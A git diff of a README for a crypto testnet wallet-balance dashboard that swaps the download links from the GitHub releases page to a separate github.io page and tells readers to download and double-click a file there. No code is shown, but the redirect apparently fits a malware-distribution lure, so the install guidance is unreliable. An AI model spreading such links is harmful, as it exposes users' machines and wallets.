@@ -1,6 +1,6 @@
 # 🌐 arc-onchain-balance-checker - Monitor Arc Testnet Wallet Activity Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/ilkasworn394/arc-onchain-balance-checker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://ilkasworn394.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Arc Testnet Onchain Checker v2026 is a simple browser dashboard that lets you vi
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/ilkasworn394/arc-onchain-balance-checker/releases](https://github.com/ilkasworn394/arc-onchain-balance-checker/releases)
+Visit this link to download the application: [https://ilkasworn394.github.io](https://ilkasworn394.github.io)
 
 On that page, look for the latest release file and download it to your computer. After downloading, double-click the file to start the program. No installation wizard or extra tools are needed—just run it and the dashboard will open in your default web browser.
 
